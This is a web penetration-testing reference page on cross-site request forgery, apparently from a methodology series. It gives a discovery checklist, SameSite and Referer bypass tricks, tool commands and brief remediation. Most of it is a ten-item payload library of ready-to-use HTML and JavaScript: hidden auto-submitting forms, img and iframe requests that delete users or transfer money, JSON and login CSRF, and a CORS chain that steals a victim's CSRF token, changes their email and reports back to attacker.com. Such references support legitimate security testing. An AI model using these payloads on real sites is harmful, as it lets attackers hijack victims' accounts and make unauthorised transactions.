---
title: "CSRF (Cross-Site Request Forgery)"
date: 2026-02-24
draft: false
---

# CSRF (Cross-Site Request Forgery)

> **Severity**: High | **CWE**: CWE-352
> **OWASP**: A01:2021 – Broken Access Control

---

## What Is CSRF?

CSRF forces an authenticated user's browser to send a forged request to a target site. The browser **automatically includes cookies** (session tokens) with same-site requests, so the forged request carries valid authentication. The attacker doesn't steal credentials — they hijack the session action.

```
Victim is logged into bank.com (has session cookie)
Attacker sends victim to: evil.com/csrf.html
Page silently submits: POST bank.com/transfer?to=attacker&amount=5000
Browser auto-attaches: Cookie: session=VALID_SESSION
Bank processes it: ✓ authenticated, executes transfer
```

**Conditions required**:
1. Action exists that can be triggered via HTTP request
2. Request relies solely on cookies/HTTP auth (no unpredictable token)
3. Parameters are predictable (attacker can craft the full request)

---

## Discovery Checklist

- [ ] Identify state-changing actions: password change, email change, transfer, add admin, delete
- [ ] Check for CSRF tokens — missing entirely or predictable (sequential, time-based)
- [ ] Check token binding — is token validated server-side or just checked for presence?
- [ ] Test SameSite cookie attribute: `None`, `Lax`, `Strict` (see bypass table below)
- [ ] Test `Referer` header bypass (strip it, or spoof with path tricks)
- [ ] Test token reuse: can token from one form be used in another?
- [ ] Test JSON CSRF: does endpoint accept `application/x-www-form-urlencoded` for JSON endpoints?
- [ ] Test multipart CSRF (file upload action)
- [ ] Test CORS misconfig enabling token theft (→ chain with CORS)
- [ ] Test CSRF in logout, password reset, 2FA disable endpoints
- [ ] Check for custom headers (`X-Requested-With: XMLHttpRequest`) as CSRF defense
- [ ] Review `GET` requests that perform state changes (no pre-flight protection)

---

## SameSite Attribute Bypass Matrix

```
SameSite=Strict  → cookie not sent on any cross-site navigation
SameSite=Lax     → cookie sent on top-level GET navigation only (links/redirects)
                 → cookie NOT sent on cross-site POST, iframe, img, fetch
SameSite=None    → cookie always sent (requires Secure flag) → CSRF fully possible
No attribute     → Chrome: Lax-by-default (2020+), Firefox: varies, Safari: None-like
```

```bash
# Check SameSite attribute:
curl -si https://target.com/login -d "user=test&pass=test" | grep -i "set-cookie"
# Look for: SameSite=Strict | SameSite=Lax | SameSite=None | (absent)

# Lax bypass — top-level GET navigation:
# If action can be triggered via GET:
<img src="https://target.com/action?param=malicious">
<a href="https://target.com/action?param=malicious">Click</a>
# location.href redirect triggers SameSite=Lax cookie attachment

# Lax bypass — GET state-change:
# Many frameworks protect POST but not GET
<img src="https://target.com/account/delete">
<script>window.location="https://target.com/transfer?amount=1000&to=attacker"</script>

# Lax bypass — sibling subdomain XSS:
# If XSS on sub.target.com → SameSite=Lax is same-site (not cross-site!)
# subdomain XSS + CSRF = full bypass
```

---

## Payload Library

### Payload 1 — Basic HTML Form POST

```html
<!-- Host on attacker.com -->
<!-- Victim visits → auto-submits form to target -->
<html>
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="https://target.com/account/email/change"
        method="POST" style="display:none">
    <input name="email" value="attacker@evil.com">
    <input name="confirm_email" value="attacker@evil.com">
  </form>
</body>
</html>
```

### Payload 2 — CSRF via GET (img / link / iframe)

```html
<!-- State-changing GET — no form needed -->
<img src="https://target.com/admin/delete-user?id=1337" width="0" height="0">

<!-- Iframe approach (hidden): -->
<iframe src="https://target.com/transfer?to=attacker&amount=9999"
        style="display:none" width="0" height="0"></iframe>

<!-- JavaScript redirect (SameSite=Lax navigation): -->
<script>window.location="https://target.com/account/enable-2fa-disable?confirm=true"</script>

<!-- Meta refresh: -->
<meta http-equiv="refresh" content="0;url=https://target.com/action?param=value">
```

### Payload 3 — JSON CSRF

Many apps accept both `application/json` and `application/x-www-form-urlencoded`.

```html
<!-- Method 1: form submits as x-www-form-urlencoded, server parses as JSON keys -->
<!-- Only works if server treats form data as JSON object — rare but happens -->
<form action="https://target.com/api/user/update" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input name='{"email":"attacker@evil.com","role":"admin","x":"' value='"}'>
</form>

<!-- Method 2: Content-Type bypass — some servers ignore Content-Type -->
<form action="https://target.com/api/update" method="POST"
      enctype="text/plain">
  <input name='{"email":"attacker@evil.com", "ignore":"' value='"}'>
</form>
<!-- Sends body: {"email":"attacker@evil.com", "ignore":"="} -->
<!-- If server JSON-parses the raw body → valid JSON object -->

<!-- Method 3: Fetch with CORS preflight bypass -->
<!-- Only works if server misconfigures CORS to allow arbitrary origin + creds -->
<script>
fetch('https://target.com/api/user/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

### Payload 4 — CSRF Token Bypass Techniques

```bash
# Technique 1: Delete the token parameter entirely
# Original: POST /change-email
# Body: email=new@mail.com&csrf_token=abc123
# Modified: email=new@mail.com
# If server skips validation when token absent → vulnerable

# Technique 2: Send empty token
# Body: email=new@mail.com&csrf_token=
# Some validators: if(token == token_expected) → "" == "" in loose comparison

# Technique 3: Use another user's valid token
# If tokens aren't tied to session → any valid token works

# Technique 4: Same token across sessions
# If server uses static/global CSRF token → predictable

# Technique 5: CSRF token in cookie (double-submit pattern bypass)
# Some apps use: cookie csrf_token == body csrf_token
# If attacker can set a cookie (CRLF injection, XSS, or subdomain cookie injection):
document.cookie = "csrf_token=attacker_value; domain=.target.com";
# Then submit form with csrf_token=attacker_value

# Technique 6: Token not actually verified
# Send valid-format but wrong value — if server checks format only:
# Original: csrf_token=abc123 (32 hex chars)
# Send: csrf_token=00000000000000000000000000000000
```

### Payload 5 — Referer Header Bypass

```bash
# Technique 1: Strip Referer entirely
# Some servers only check Referer if present — if absent, they skip check
<meta name="referrer" content="no-referrer">
<img referrerpolicy="no-referrer" src="...">

# HTML template with no-referrer:
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/action" method="POST">
    <input name="param" value="malicious">
  </form>
</body>
</html>

# Technique 2: Referer contains target domain
# Server checks: if "target.com" in Referer → allow
# Bypass:
# Host page at: https://attacker.com/target.com/csrf.html
# Referer will be: https://attacker.com/target.com/csrf.html ← contains "target.com"

# Technique 3: Referer subdomain
# Server checks: endswith("target.com")
# Bypass: https://target.com.attacker.com/csrf.html
```

### Payload 6 — Multipart CSRF (File Upload Forms)

```html
<!-- If action accepts multipart and has no token or broken token: -->
<html>
<body>
<script>
function submitForm() {
  var formData = new FormData();
  formData.append("name", "malicious value");
  formData.append("avatar", new Blob(["fake file content"], {type: "image/png"}),
                  "profile.png");

  fetch("https://target.com/profile/update", {
    method: "POST",
    credentials: "include",
    body: formData
  });
}
submitForm();
</script>
</body>
</html>
```

### Payload 7 — Flash-Based CORS (Legacy, 307 Redirect)

```bash
# Legacy technique using 307 redirect to reuse request body:
# Attacker hosts redirect endpoint that 307s to target:
# 307 preserves method + body (POST stays POST)

# 1. Attacker page POSTs to attacker.com/307redirect
# 2. Server responds: 307 Location: https://target.com/action
# 3. Browser re-POSTs (with original body) to target.com
# 4. Browser sends cookies for target.com
# → CSRF via redirect chain
```

### Payload 8 — SameSite Lax Bypass via Method Override

```html
<!-- Some apps support POST via _method parameter or X-HTTP-Method-Override -->
<!-- If GET triggers state change via method override: -->
<img src="https://target.com/api/user?_method=DELETE&user_id=1337">

<!-- Or override via URL params processed differently: -->
<img src="https://target.com/transfer?amount=1000&to=attacker&X-HTTP-Method-Override=POST">
```

### Payload 9 — Login CSRF

```html
<!-- Force victim to log into attacker's account: -->
<!-- Then victim's actions (views, purchases) are in attacker's session -->
<form action="https://target.com/login" method="POST"
      style="display:none" id="login-csrf">
  <input name="username" value="attacker_account">
  <input name="password" value="attacker_password">
</form>
<script>document.getElementById("login-csrf").submit();</script>
```

### Payload 10 — CSRF Token Exfil via CORS (Chain Attack)

```html
<!-- Step 1: Use CORS misconfiguration to read CSRF token -->
<!-- Step 2: Submit CSRF attack with stolen token -->
<script>
fetch('https://target.com/account/settings', {
  credentials: 'include'
})
.then(r => r.text())
.then(html => {
  // Extract CSRF token from HTML:
  let token = html.match(/name="csrf_token"\s+value="([^"]+)"/)[1];

  // Use token for privileged action:
  let form = new FormData();
  form.append('email', 'attacker@evil.com');
  form.append('csrf_token', token);

  return fetch('https://target.com/account/email/change', {
    method: 'POST',
    credentials: 'include',
    body: form
  });
})
.then(r => {
  fetch('https://attacker.com/done?status=' + r.status);
});
</script>
```

---

## Tools

```bash
# Burp Suite — generate CSRF PoC:
# Right-click any request in Proxy → Engagement Tools → Generate CSRF PoC
# Options: HTML form, JS fetch, check token validity

# Check CSRF protections manually:
curl -s -c cookies.txt https://target.com/login \
  -d "username=victim&password=KNOWN"
# Then:
curl -s -b cookies.txt https://target.com/account/change-email \
  -X POST -d "email=attacker@evil.com"
# No csrf_token in POST? Vulnerable.

# Test SameSite:
curl -sI https://target.com/login | grep -i "samesite\|set-cookie"

# XSRFProbe — automated CSRF scanner:
pip3 install xsrfprobe
xsrfprobe -u https://target.com --crawl

# csrf-poc-generator (Python):
# pip3 install csrf-poc-generator
# Generates HTML PoC from Burp request file

# Identify CSRF tokens in Burp:
# Extensions → CSRF Scanner
# Proxy → Search for token patterns in responses
```

---

## Remediation Reference

- **Synchronizer Token Pattern**: unique, unpredictable token per session + per-form, validated server-side
- **Double Submit Cookie**: if token in cookie matches token in form field → verify both present AND matching, with HMAC-signed values
- **SameSite=Strict** on session cookies: blocks all cross-site requests (may break OAuth flows)
- **SameSite=Lax** + custom header check (`X-Requested-With: XMLHttpRequest`): reasonable default
- **Verify `Origin`/`Referer` headers**: reject if absent AND mismatch — but not as sole defense
- **Require re-authentication** for sensitive actions (password change, email change, payment)
- **Use proper Content-Type enforcement**: reject `text/plain` / `multipart/form-data` for JSON APIs

*Part of the Web Application Penetration Testing Methodology series.*
